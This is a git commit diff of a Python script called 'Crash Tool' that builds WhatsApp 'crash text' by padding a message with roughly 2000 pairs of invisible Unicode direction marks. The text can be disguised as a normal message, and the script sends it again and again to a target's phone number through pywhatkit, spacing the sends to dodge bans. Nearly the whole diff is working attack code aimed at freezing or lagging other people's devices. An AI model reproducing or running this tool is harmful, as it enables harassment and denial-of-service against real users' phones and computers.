b75d226f966a8282c5283a542a16afe8ec7b3224
Karma <125462257+KarmaCyberWarrior@users.noreply.github.com>
2023-02-18 17:47:22 +0100

    Updated again

--- scream.py
+++ scream.py
@@ -3,20 +3,17 @@
 
 from datetime import datetime
 import sys
+import time
+from time import sleep
 
-now = datetime.now()
-hour = now.hour
-mintoexecute = now.minute + 1
 messagetosend = "Ahhhhhh"
 
 intensitynum = 3
 page = 1
+error = False
 errorintensity = False
-
 while page == 1:
-	if errorintensity == True:
-		print("\033[0;31;40mInput the right intensity number")
-		print("")
+		
 	print("\033[0;32;40m#########################")
 	print("#")
 	print("#")
@@ -27,38 +24,98 @@ while page == 1:
 	print("Crash Tool || \nDo not use againt devices not permitted to use ||")
 	print("karma-cyberwarrior.netlify.app")
 	print(" ")
+	if error  == True:
+		print("[ × ] Please input a correct option")
+		
+	print("Choose an option")
+	print("1. Automate the message(less effective/little lag)")
+	print("2. Generate a crash message disguised as a normal message(Dangerous and to be only used with PC)")
+	print("3. Exit")
+	option = input("Choose a number: ")
+	
+	if option == "1":
+		page = 4
+	elif option == "2":
+		page = 5
+	elif option == "3":
+		print("Good bye!")
+		time.sleep(0.5)
+		sys.exit()
+	else:
+		page = 1
+		error = True
+
+while page == 5:
+	if errorintensity == True:
+		print("Please input a right intensity number")
+		print("")
 	print("Enter the following details")
-	target = input("Target's number e.g +234: ")
+	message = input("Enter message to turn to crash text: ")
+	intensity = int(input("Enter intensity number on 1-5: "))
+	move = False 
+	
+	if intensity == 1:
+		move = True
+	elif intensity == 2:
+		move = True
+	elif intensity == 3:
+		move = True
+	else:
+		errorintensity = True
+		page = 5
+
+	if message != "" and message != " ":
+		messagetosend = message
+		
+	messageconv = [ ]
+	
+	
+	for char in messagetosend:
+		ascii = ord(char)
+		seek = ascii
+		messageconv.append(seek)
+	
+	count = 0
+	
+	while count <= 2000:
+		bug = 8206
+		bugt = 8207
+		messageconv.append(bug)
+		messageconv.append(bugt)
+		count = count + 1
+		
+		
+	wordbug = ""
+	for num in messageconv:
+		wordbug = wordbug + chr(num)
+		
+	final = wordbug
+	
+	print("Copy the text below")
+	print(final)
+	page = 3
+
+while page == 4:
+	print("Enter the following details")
+	councode = input("Target's country code e.g (234, 91): ")
+	number = input(f"Target's number: {councode} ")
+	targetno = f"+{councode}{number}"
 	message = input("Type a normal message: ")
 	print("")
-	print("\033[1;31;40mThe damage level of the crash is on a scale of 1-5.\nRecommended: 3")
+	print("\033[1;31;40mDue to browser url limit, the crash text would be shortened and sent multiple times.\nTo avoid ban, there'd be timer interval.")
 	print("\033[0;32;40m")
-	intensity = input("Damage level of crash: ")
+	crashtimes = int(input("Amount of times to send the message: "))
 	
 	print("")
 	print("loading")
 	
 	if message != "" and message != " ":
 		messagetosend = message
+
+	page = 2
 		
-	if intensity == "1":
-		intensitynum = 1
-		page = 2
-	elif intensity == "2":
-		intensitynum = 2
-		page = 2
-	elif intensity == "3":
-		intensitynum = 3
-		page = 2
-	elif intensity == "4":
-		intensitynum = 4
-		page = 2
-	elif intensity == "5":
-		intensitynum = 5
-		page = 2
-	else:
-		errorintensity = True
-		page = 1
+
+		
 		
 while page == 2:
 	messageconv = [ ]
@@ -70,29 +127,32 @@ while page == 2:
 		messageconv.append(seek)
 	
 	count = 0
-	intensitydamage = intensitynum * 50000
-	while count <= intensitydamage:
+	
+	while count <= 2000:
 		bug = 8206
 		bugt = 8207
 		messageconv.append(bug)
 		messageconv.append(bugt)
 		count = count + 1
 		
-	print(messageconv)
 		
 	wordbug = ""
 	for num in messageconv:
 		wordbug = wordbug + chr(num)
 		
 	final = wordbug
-	print(final)
-	
-	
 	import pywhatkit
-	now = datetime.now()
-	hour = now.hour
-	mintoexec = now.minute + 1
-	pywhatkit.sendwhatmsg(target, final, hour, mintoexec)
+	
+
+	for i in range (crashtimes):
+		print("")
+		print("Sending crasht text...")
+		now = datetime.now()
+		hour = now.hour
+		mintoexec = now.minute + 1
+		pywhatkit.sendwhatmsg(targetno, final, hour, mintoexec)
+		time.sleep(60)
+	
 	page = 3
 	
 	
